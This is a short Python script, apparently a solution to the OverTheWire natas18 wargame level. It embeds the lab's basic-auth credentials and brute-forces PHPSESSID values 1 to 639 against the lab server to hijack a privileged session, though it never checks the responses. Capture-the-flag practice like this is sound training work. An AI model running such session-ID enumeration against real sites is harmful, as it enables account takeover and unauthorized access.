from requests import post
from requests.auth import HTTPBasicAuth

url = "http://natas18.natas.labs.overthewire.org/"
auth = HTTPBasicAuth("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")

for i in range(1, 640):
  r = post(
    url = url,
    auth = auth,
    cookies=dict({
      "PHPSESSID": str(i)
    })
  )

